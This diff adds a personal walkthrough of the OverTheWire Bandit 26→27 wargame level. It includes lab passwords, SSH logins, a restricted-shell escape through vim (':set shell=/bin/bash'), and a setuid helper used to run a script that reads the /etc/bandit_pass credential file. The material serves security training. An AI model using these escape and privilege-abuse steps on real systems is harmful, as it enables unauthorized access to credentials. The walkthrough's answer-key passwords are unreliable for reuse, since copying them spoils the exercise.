@@ -1,0 +1,39 @@
+Bandit Level 26 → Level 27
+Level Goal
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+Commands you may need to solve this level
+ls
+
+
+Username 
+Bandit26
+
+Password
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+====================================================
+
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+( we notice that we cannot log in it auto Closes, We will need to double back and use bandit25 user and pivot in)
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+ssh -i bandit26.sshkey bandit26@localhost
+( Make sure you zoom in) 
+Type in v to enable vim 
+:shell
+escape 
+:set shell=/bin/bash
+:shell
+whoami bandit26@bandit
+ls
+file bandit27-do
+./bandit27-do whoami
+mkdir /tmp/pass27
+chmod 777 /tmp/pass27
+echo 'cat /etc/bandit_pass/bandit27' > /tmp/pass27/script.sh
+chmod 777 /tmp/pass27/script.sh
+./bandit27-do /tmp/pass27/script.sh
+3ba3118a22e93127a4ed485be72ef5ea
